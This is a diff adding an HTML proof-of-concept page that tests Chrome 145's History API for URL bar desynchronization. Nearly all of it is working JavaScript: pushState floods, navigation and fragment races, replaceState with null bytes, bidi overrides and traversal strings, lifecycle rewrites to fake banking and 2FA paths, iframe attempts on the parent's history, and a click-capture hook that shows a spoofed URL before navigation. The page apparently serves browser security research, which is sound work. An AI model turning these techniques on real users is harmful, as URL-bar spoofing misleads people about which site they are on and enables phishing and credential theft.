@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>PoC: History API URL Bar Desync — Chrome 145</title>
+<style>
+  body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
+  h1 { color: #ff6b6b; }
+  h2 { color: #ffa500; }
+  .test-case { background: #16213e; border: 1px solid #333; padding: 15px; margin: 10px 0; border-radius: 5px; }
+  pre { white-space: pre-wrap; word-break: break-all; color: #7bed9f; }
+  button { background: #e74c3c; color: #fff; border: none; padding: 8px 16px; cursor: pointer; margin: 4px; border-radius: 3px; }
+  button:hover { background: #c0392b; }
+  .warn { color: #f1c40f; font-size: 0.85em; }
+  #status-bar { position: fixed; top: 0; left: 0; right: 0; background: #e74c3c; color: #fff; padding: 5px 20px; font-size: 12px; z-index: 9999; }
+</style>
+</head>
+<body>
+<div id="status-bar">URL: <span id="current-url"></span> | Actual: <span id="actual-url"></span></div>
+<div style="margin-top: 30px;">
+<h1>PoC: History API URL Bar Desynchronization</h1>
+<p class="warn">Target: Chrome 145 | Tests history.pushState/replaceState for URL bar confusion</p>
+<p class="warn">Related: CVE-2023-3079, CVE-2022-2856 (navigation/history confusion)</p>
+
+<h2>Test 1: Rapid pushState flood</h2>
+<div class="test-case">
+  <p>Pushes thousands of history entries rapidly. Tests if URL bar can keep up or shows stale URL.</p>
+  <button onclick="test1(100)">Push 100 states</button>
+  <button onclick="test1(1000)">Push 1000 states</button>
+  <button onclick="test1(10000)">Push 10000 states</button>
+  <pre id="t1"></pre>
+</div>
+
+<h2>Test 2: pushState + immediate navigation</h2>
+<div class="test-case">
+  <p>Calls pushState then immediately triggers navigation. Tests race condition in URL bar update.</p>
+  <button onclick="test2()">Run Test</button>
+  <pre id="t2"></pre>
+</div>
+
+<h2>Test 3: replaceState with special URL characters</h2>
+<div class="test-case">
+  <p>Uses replaceState with URLs containing special characters that may confuse the URL bar parser.</p>
+  <button onclick="test3()">Run Test</button>
+  <pre id="t3"></pre>
+</div>
+
+<h2>Test 4: pushState + popstate event manipulation</h2>
+<div class="test-case">
+  <p>Pushes state, intercepts popstate, and tries to re-push during the event handler.</p>
+  <button onclick="test4()">Run Test</button>
+  <button onclick="history.back()">Trigger back</button>
+  <pre id="t4"></pre>
+</div>
+
+<h2>Test 5: History + fragment navigation race</h2>
+<div class="test-case">
+  <p>Rapidly alternates between pushState and fragment navigation (#) to desync URL bar.</p>
+  <button onclick="test5()">Run Test</button>
+  <pre id="t5"></pre>
+</div>
+
+<h2>Test 6: replaceState during onload/DOMContentLoaded</h2>
+<div class="test-case">
+  <p>Tests if replaceState during page lifecycle events can show a different URL than what was navigated to.</p>
+  <button onclick="test6()">Open new window with test</button>
+  <pre id="t6"></pre>
+</div>
+
+<h2>Test 7: Cross-origin pushState attempt via iframe</h2>
+<div class="test-case">
+  <p>Tries to manipulate parent's URL bar from an iframe using postMessage + history coordination.</p>
+  <button onclick="test7()">Run Test</button>
+  <pre id="t7"></pre>
+  <iframe id="t7frame" style="width:100%;height:100px;border:1px solid #555;display:none;"></iframe>
+</div>
+
+<h2>Test 8: Timing attack — pushState between user gesture and navigation</h2>
+<div class="test-case">
+  <p>Hooks into click events to pushState between user click and actual navigation, attempting URL bar desync.</p>
+  <a href="https://example.com" id="t8link" style="color:#ff6348;font-size:18px;">Click me (navigates to example.com)</a>
+  <pre id="t8"></pre>
+</div>
+</div>
+
+<script>
+const log = (id, msg) => {
+  document.getElementById(id).textContent += msg + '\n';
+};
+
+// Continuous URL bar tracker
+setInterval(() => {
+  document.getElementById('current-url').textContent = location.href;
+  document.getElementById('actual-url').textContent = document.title;
+}, 100);
+
+// Test 1: Rapid pushState flood
+function test1(count) {
+  const el = document.getElementById('t1');
+  el.textContent = '';
+  log('t1', `Starting ${count} rapid pushState calls...`);
+  const startUrl = location.href;
+  const start = performance.now();
+
+  for (let i = 0; i < count; i++) {
+    try {
+      history.pushState({ i }, '', `/fake-path-${i}?q=test&session=${Math.random()}`);
+    } catch (e) {
+      log('t1', `Failed at iteration ${i}: ${e.message}`);
+      break;
+    }
+  }
+
+  const elapsed = performance.now() - start;
+  log('t1', `Completed in ${elapsed.toFixed(1)}ms`);
+  log('t1', `Final URL: ${location.href}`);
+  log('t1', `History length: ${history.length}`);
+  log('t1', 'Check URL bar — does it show the last pushed state?');
+  log('t1', 'Now rapidly going back...');
+
+  // Restore
+  history.replaceState({}, '', startUrl);
+  log('t1', `Restored URL: ${location.href}`);
+}
+
+// Test 2: pushState + immediate navigation
+function test2() {
+  log('t2', 'Pushing state then scheduling navigation...');
+  const origUrl = location.href;
+
+  // Push misleading state
+  history.pushState({}, 'Login', '/accounts/login?redirect=dashboard');
+  log('t2', `After pushState: ${location.href}`);
+
+  // Schedule multiple rapid location changes
+  setTimeout(() => {
+    history.replaceState({}, '', '/secure/banking');
+    log('t2', `After replaceState: ${location.href}`);
+  }, 0);
+
+  setTimeout(() => {
+    history.pushState({}, '', '/settings/2fa');
+    log('t2', `After 2nd pushState: ${location.href}`);
+  }, 1);
+
+  setTimeout(() => {
+    // Use location.hash to trigger hashchange without full nav
+    location.hash = '#verified';
+    log('t2', `After hash change: ${location.href}`);
+  }, 2);
+
+  setTimeout(() => {
+    history.replaceState({}, '', origUrl);
+    log('t2', `Restored: ${location.href}`);
+    log('t2', 'Check if URL bar was ever desynchronized during rapid changes.');
+  }, 500);
+}
+
+// Test 3: Special characters in replaceState URLs
+function test3() {
+  const origUrl = location.href;
+  const testUrls = [
+    '/path%00with%00nulls',
+    '/path\twith\ttabs',
+    '/path with spaces',
+    '/' + 'A'.repeat(10000),  // Very long path
+    '/path?q=' + encodeURIComponent('<script>alert(1)<\/script>'),
+    '/path#' + '\u202E' + 'moc.elgoog',  // RTL override in fragment
+    '/path?' + 'a='.repeat(5000),  // Many parameters
+    '/..',  // Path traversal
+    '/./././././test',  // Dot segments
+    '/path%2F%2E%2E%2Ftraversal',  // Encoded traversal
+    '/%E2%80%AE%E2%80%AD',  // Encoded bidi chars
+  ];
+
+  for (const url of testUrls) {
+    try {
+      history.replaceState({}, '', url);
+      log('t3', `OK: replaceState("${url.substring(0, 60)}...") → location.href = ${location.href.substring(0, 100)}`);
+    } catch (e) {
+      log('t3', `BLOCKED: replaceState("${url.substring(0, 60)}...") → ${e.message}`);
+    }
+  }
+
+  history.replaceState({}, '', origUrl);
+  log('t3', `\nRestored. Check which special URLs were accepted.`);
+}
+
+// Test 4: popstate event manipulation
+let popstateHooked = false;
+function test4() {
+  if (!popstateHooked) {
+    window.addEventListener('popstate', function(e) {
+      log('t4', `popstate fired! state=${JSON.stringify(e.state)} url=${location.href}`);
+
+      // Try to re-push during popstate handler
+      try {
+        history.pushState({ injected: true }, '', '/injected-during-popstate');
+        log('t4', `Re-pushed during popstate: ${location.href}`);
+        log('t4', 'FINDING: pushState allowed during popstate handler!');
+      } catch (err) {
+        log('t4', `Re-push blocked: ${err.message}`);
+      }
+    });
+    popstateHooked = true;
+    log('t4', 'Popstate handler installed.');
+  }
+
+  // Push some states
+  history.pushState({ step: 1 }, '', '/step-1');
+  history.pushState({ step: 2 }, '', '/step-2');
+  history.pushState({ step: 3 }, '', '/step-3');
+  log('t4', `Pushed 3 states. Current: ${location.href}`);
+  log('t4', 'Click "Trigger back" to fire popstate event.');
+}
+
+// Test 5: History + fragment race
+function test5() {
+  const origUrl = location.href;
+  log('t5', 'Starting history + fragment race...');
+
+  let ops = 0;
+  const interval = setInterval(() => {
+    if (ops >= 50) {
+      clearInterval(interval);
+      history.replaceState({}, '', origUrl);
+      log('t5', `\nCompleted ${ops} operations. Final URL: ${location.href}`);
+      return;
+    }
+
+    if (ops % 3 === 0) {
+      history.pushState({}, '', `/race-${ops}`);
+    } else if (ops % 3 === 1) {
+      location.hash = `#frag-${ops}`;
+    } else {
+      history.replaceState({}, '', `/replaced-${ops}`);
+    }
+    ops++;
+  }, 1);  // 1ms interval = maximum speed
+}
+
+// Test 6: replaceState during page load
+function test6() {
+  const html = `<!DOCTYPE html>
+<html><head>
+<script>
+// Replace URL as early as possible during load
+document.addEventListener('DOMContentLoaded', function() {
+  try {
+    history.replaceState({}, 'Bank Login', '/online-banking/login');
+    document.getElementById('log').textContent += 'DOMContentLoaded replaceState: ' + location.href + '\\n';
+  } catch(e) {
+    document.getElementById('log').textContent += 'DOMContentLoaded error: ' + e.message + '\\n';
+  }
+});
+
+window.addEventListener('load', function() {
+  try {
+    history.replaceState({}, 'Dashboard', '/dashboard/accounts');
+    document.getElementById('log').textContent += 'load replaceState: ' + location.href + '\\n';
+  } catch(e) {
+    document.getElementById('log').textContent += 'load error: ' + e.message + '\\n';
+  }
+});
+<\/script>
+</head>
+<body>
+<h2>replaceState During Page Load</h2>
+<pre id="log">Page loaded. Checking lifecycle replaceState behavior...
+</pre>
+<p>Check the URL bar: does it show the original URL or the replaced one?</p>
+</body></html>`;
+
+  const blob = new Blob([html], { type: 'text/html' });
+  const url = URL.createObjectURL(blob);
+  window.open(url, '_blank');
+  log('t6', `Opened: ${url}`);
+  log('t6', 'Check if URL bar shows blob URL or the replaceState path.');
+}
+
+// Test 7: iframe history coordination
+function test7() {
+  const frame = document.getElementById('t7frame');
+  frame.style.display = 'block';
+
+  const iframeHtml = `<!DOCTYPE html><html><body>
+<script>
+  // Try to pushState for the parent
+  try {
+    parent.history.pushState({}, '', '/hacked');
+    parent.postMessage({type:'history-test', msg:'pushState on parent succeeded!'}, '*');
+  } catch(e) {
+    parent.postMessage({type:'history-test', msg:'pushState on parent blocked: '+e.message}, '*');
+  }
+
+  // Try own pushState
+  try {
+    history.pushState({}, '', '/iframe-pushed');
+    parent.postMessage({type:'history-test', msg:'iframe pushState: '+location.href}, '*');
+  } catch(e) {
+    parent.postMessage({type:'history-test', msg:'iframe pushState error: '+e.message}, '*');
+  }
+
+  // Rapidly manipulate iframe history
+  for(let i=0;i<100;i++) {
+    try { history.pushState({i}, '', '/iframe-'+i); } catch(e) { break; }
+  }
+  parent.postMessage({type:'history-test', msg:'iframe pushed 100 states, history.length='+history.length}, '*');
+<\/script>
+</body></html>`;
+
+  const blob = new Blob([iframeHtml], { type: 'text/html' });
+  frame.src = URL.createObjectURL(blob);
+
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.type === 'history-test') {
+      log('t7', e.data.msg);
+    }
+  });
+}
+
+// Test 8: Click hijack for pushState
+document.getElementById('t8link').addEventListener('click', function(e) {
+  // Before navigation occurs, push a misleading state
+  log('t8', 'Click detected! Pushing state before navigation...');
+  try {
+    history.pushState({}, '', '/legitimate-looking-page');
+    log('t8', `Pushed state: ${location.href}`);
+    log('t8', 'Navigation would now proceed. URL bar shows pushed state momentarily.');
+    log('t8', 'If navigation is slow, user sees the spoofed URL.');
+  } catch (err) {
+    log('t8', 'pushState failed: ' + err.message);
+  }
+  e.preventDefault();
+  log('t8', '(Navigation prevented for testing. In real attack, it would proceed.)');
+}, true);  // Capture phase = fires first
+</script>
+</body>
+</html>
